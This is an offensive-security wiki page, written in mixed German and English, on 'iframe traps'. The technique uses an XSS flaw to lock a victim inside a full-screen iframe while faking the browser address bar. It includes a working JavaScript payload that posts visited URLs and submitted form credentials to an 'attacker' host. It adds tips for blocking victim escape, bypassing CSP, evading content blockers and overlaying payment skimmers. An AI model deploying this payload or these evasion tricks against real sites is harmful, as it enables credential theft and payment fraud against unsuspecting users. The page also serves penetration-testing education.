# Iframe Traps

{{#include ../banners/hacktricks-training.md}}

## Grundlegende Informationen

This form of abusing XSS via iframes to steal information from the user moving across the web page was originally published in these 2 post from trustedsec.com: [**here**](https://trustedsec.com/blog/persisting-xss-with-iframe-traps) **und** [**here**](https://trustedsec.com/blog/js-tap-weaponizing-javascript-for-red-teams).

Der Angriff beginnt auf einer Seite, die für XSS verwundbar ist, bei der es möglich ist, die **Opfer daran zu hindern, die XSS zu verlassen**, indem man sie **innerhalb eines iframe** navigieren lässt, der die gesamte Webanwendung einnimmt.

Der XSS-Angriff lädt im Grunde die Webseite in einem iframe, das 100% des Bildschirms einnimmt. Daher wird das Opfer **nicht bemerken, dass es sich in einem iframe befindet**. Wenn das Opfer auf der Seite durch Anklicken von Links innerhalb des iframe (innerhalb der Webanwendung) navigiert, bewegt es sich **innerhalb des iframe**, während das eingebettete beliebige JS Informationen aus dieser Navigation stiehlt.

Außerdem, um es realistischer zu machen, ist es möglich, einige **listeners** zu verwenden, um zu prüfen, wann ein iframe die Location der Seite ändert, und die URL des Browsers mit diesen Locations zu aktualisieren, sodass der Benutzer glaubt, er navigiere die Seiten im Browser.

<figure><img src="../images/image (1248).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png">https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png</a></p></figcaption></figure>

<figure><img src="../images/image (1249).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png">https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png</a></p></figcaption></figure>

Außerdem können listener verwendet werden, um sensible Informationen zu stehlen — nicht nur die anderen Seiten, die das Opfer besucht, sondern auch die Daten aus **ausgefüllten Formularen**, diese zu senden (credentials?) oder den **local storage zu stehlen**...

Natürlich bestehen die Hauptbegrenzungen darin, dass ein **Opfer durch Schließen des Tabs oder Eingabe einer anderen URL im Browser dem iframe entkommt**. Eine andere Möglichkeit wäre, die Seite **neu zu laden**, dies kann jedoch teilweise **verhindert** werden, indem man beim Laden jeder neuen Seite im iframe das Kontextmenü (Rechtsklick) deaktiviert oder erkennt, wenn die Maus des Nutzers das iframe verlässt — etwa um den Reload-Button des Browsers zu klicken. In diesem Fall wird die URL des Browsers auf die ursprüngliche, für XSS verwundbare URL zurückgesetzt, sodass beim Neuladen die Seite erneut manipuliert wird (Hinweis: das ist nicht sehr unauffällig).

## Modernisierte Falle (2024+)

* Verwende ein **full‑viewport iframe** plus History/Navigation API, um echte Navigation zu simulieren.

<details>
<summary>Full-viewport iframe trap</summary>
```html
<script>
const i=document.createElement('iframe');
i.src=location.href;
i.style='position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
document.body.appendChild(i);
function sync(url){history.replaceState({},'',url);}
i.addEventListener('load',()=>{
const w=i.contentWindow;
['hashchange','popstate'].forEach(ev=>w.addEventListener(ev,()=>sync(w.location.href)));
w.addEventListener('click',()=>fetch('//attacker/log',{method:'POST',body:w.location.href}));
w.document.addEventListener('submit',ev=>{
const fd=new FormData(ev.target);
fetch('//attacker/creds',{method:'POST',body:new URLSearchParams(fd)});
},true);
});
</script>
```
</details>

* **Navigation API** (`navigation.navigate`, `currententrychange`) hält die äußere Adressleiste synchron, ohne die echte URL zu leak.
* Gehe in **fullscreen**, um die Browser‑UI zu verbergen und eine eigene gefälschte Adressleiste/Schloss‑Icon zu zeichnen.

## Overlay & skimmer usage

* Kompromittierte Händler ersetzen gehostete payment iframes (Stripe, Adyen, etc.) durch ein **pixel‑perfect overlay**, das Tastenanschläge weiterleitet, während der echte Frame darunter bleibt — manchmal unter Verwendung von legacy validation APIs, damit der Flow nie bricht.
* Nutzer im top frame zu fangen erfasst **autofill/password‑manager**‑Daten, bevor sie bemerken, dass sich die URL‑Leiste nie geändert hat.

## Evasion tricks observed in 2025 research

* `about:blank`/`data:` lokale Frames erben die parent origin und umgehen einige content‑blocker‑Heuristiken; verschachtelte iframes können respawnen, selbst wenn Extensions third‑party frames entfernen.
* **Permission propagation**: Durch Umschreiben des parent `allow`‑Attributes erhalten verschachtelte attacker frames fullscreen/camera/microphone ohne offensichtliche DOM‑Änderungen.

## Quick OPSEC tips

* Re‑fokussiere das iframe, wenn die Maus die Seite verlässt (`mouseleave` on body), um zu verhindern, dass Benutzer die Browser‑UI erreichen.
* Deaktiviere das Kontextmenü und gängige Shortcuts (`keydown` für `F11`, `Ctrl+L`, `Ctrl+T`) im Frame, um Fluchtversuche zu verlangsamen.
* Falls CSP inline Scripts blockiert, injiziere einen remote bootstrapper und aktiviere `srcdoc` am iframe, sodass dein Payload außerhalb der durchgesetzten CSP der Hauptseite lebt.

## Related

{{#ref}}
clickjacking.md
{{#endref}}



## References

- [Iframe security exposed: blind spot fueling payment skimmer attacks (2025)](https://thehackernews.com/2025/09/iframe-security-exposed-blind-spot.html)
- [Local Frames: exploiting inherited origins to bypass blockers (2025)](https://arxiv.org/abs/2506.00317)
{{#include ../banners/hacktricks-training.md}}
